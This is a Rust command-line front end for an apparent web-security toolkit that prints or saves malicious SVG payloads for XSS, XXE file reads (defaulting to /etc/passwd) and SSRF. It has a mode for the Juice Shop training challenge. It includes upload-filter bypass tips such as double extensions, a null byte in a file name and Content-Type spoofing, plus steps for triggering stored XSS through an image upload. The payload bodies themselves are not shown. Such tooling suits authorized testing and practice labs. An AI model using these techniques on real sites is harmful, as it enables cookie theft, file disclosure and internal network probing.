//! SVG payload generator CLI
//!
//! Usage:
//!   svg-gen xss
//!   svg-gen xxe
//!   svg-gen ssrf
//!   svg-gen generate xss "alert(document.cookie)"
//!   svg-gen generate ssrf "http://internal:8080"
//!   svg-gen juice-shop

use clap::{Parser, Subcommand};
use std::fs;
use std::path::PathBuf;
use web_security_toolkit::svg::*;

#[derive(Parser)]
#[command(name = "svg-gen")]
#[command(about = "SVG payload generator for XSS, XXE, and SSRF attacks")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// SVG XSS payloads
    Xss {
        /// Save to file
        #[arg(short, long)]
        output: Option<PathBuf>,
        /// Payload index to save (default: show all)
        #[arg(short, long)]
        index: Option<usize>,
    },
    /// SVG XXE payloads
    Xxe {
        /// Save to file
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
    /// SVG SSRF payloads
    Ssrf {
        /// Save to file
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
    /// Generate custom SVG payload
    Generate {
        #[command(subcommand)]
        payload_type: GenerateType,
    },
    /// Cross-Site Imaging attack payloads
    Imaging,
    /// Content-Types and extensions for upload bypass
    Bypass,
    /// Juice Shop Cross-Site Imaging challenge
    JuiceShop {
        /// Save to file
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
}

#[derive(Subcommand)]
enum GenerateType {
    /// Generate XSS payload with custom script
    Xss {
        /// JavaScript code to embed
        script: String,
        /// Output file
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
    /// Generate SSRF payload with custom URL
    Ssrf {
        /// Target URL
        url: String,
        /// Output file
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
    /// Generate XXE payload for file read
    Xxe {
        /// Target file path
        #[arg(default_value = "/etc/passwd")]
        file: String,
        /// Output file
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Xss { output, index } => {
            let payloads = svg_xss_payloads();

            if let Some(idx) = index {
                if idx >= payloads.len() {
                    eprintln!("Invalid index. Max: {}", payloads.len() - 1);
                    std::process::exit(1);
                }

                let payload = &payloads[idx];
                if let Some(content) = &payload.file_content {
                    if let Some(path) = output {
                        save_file(&path, content);
                    } else {
                        println!("{}", content);
                    }
                }
            } else {
                println!("=== SVG XSS Payloads ===\n");

                for (i, payload) in payloads.iter().enumerate() {
                    println!("[{}] {}", i, payload.name);
                    println!("    Inline: {}", payload.payload);
                    println!();
                }

                println!("Use -i <index> -o <file> to save a specific payload");
            }
        }
        Commands::Xxe { output } => {
            let payloads = svg_xxe_payloads();

            println!("=== SVG XXE Payloads ===\n");

            for (i, payload) in payloads.iter().enumerate() {
                println!("[{}] {}", i, payload.name);
                if let Some(content) = &payload.file_content {
                    println!("{}\n", content);
                }
            }

            if let Some(path) = output {
                if let Some(content) = &payloads[0].file_content {
                    save_file(&path, content);
                }
            }
        }
        Commands::Ssrf { output } => {
            let payloads = svg_ssrf_payloads();

            println!("=== SVG SSRF Payloads ===\n");

            for (i, payload) in payloads.iter().enumerate() {
                println!("[{}] {}", i, payload.name);
                if let Some(content) = &payload.file_content {
                    println!("{}\n", content);
                }
            }

            if let Some(path) = output {
                if let Some(content) = &payloads[0].file_content {
                    save_file(&path, content);
                }
            }
        }
        Commands::Generate { payload_type } => match payload_type {
            GenerateType::Xss { script, output } => {
                let svg = generate_svg_xss(&script);
                output_svg(svg, output);
            }
            GenerateType::Ssrf { url, output } => {
                let svg = generate_svg_ssrf(&url);
                output_svg(svg, output);
            }
            GenerateType::Xxe { file, output } => {
                let svg = generate_svg_xxe(&file);
                output_svg(svg, output);
            }
        },
        Commands::Imaging => {
            println!("=== Cross-Site Imaging Payloads ===\n");

            for payload in cross_site_imaging_payloads() {
                println!("{}", payload.name);
                if let Some(content) = &payload.file_content {
                    println!("{}\n", content);
                }
            }
        }
        Commands::Bypass => {
            println!("=== SVG Upload Bypass ===\n");

            println!("Content-Types to try:");
            for ct in svg_content_types() {
                println!("  {}", ct);
            }

            println!("\nFile extensions to try:");
            for ext in svg_extensions() {
                println!("  {}", ext);
            }

            println!("\nTips:");
            println!("  - Try changing Content-Type to image/png or image/jpeg");
            println!("  - Use double extensions: malicious.svg.png");
            println!("  - Try null byte: malicious.svg%00.png");
            println!("  - Some servers only check magic bytes, not extension");
        }
        Commands::JuiceShop { output } => {
            let payload = juice_shop_cross_site_imaging();

            println!("=== Juice Shop Cross-Site Imaging ===\n");
            println!("{}\n", payload.name);

            if let Some(content) = &payload.file_content {
                println!("SVG Content:");
                println!("{}\n", content);

                if let Some(path) = output {
                    save_file(&path, content);
                }
            }

            println!("Steps:");
            println!("  1. Save the SVG file (use -o flag)");
            println!("  2. Upload as profile picture or product image");
            println!("  3. View the image to trigger XSS");
        }
    }
}

fn output_svg(svg: String, output: Option<PathBuf>) {
    if let Some(path) = output {
        save_file(&path, &svg);
    } else {
        println!("{}", svg);
    }
}

fn save_file(path: &PathBuf, content: &str) {
    match fs::write(path, content) {
        Ok(_) => println!("[+] Saved to: {}", path.display()),
        Err(e) => {
            eprintln!("[-] Error saving file: {}", e);
            std::process::exit(1);
        }
    }
}
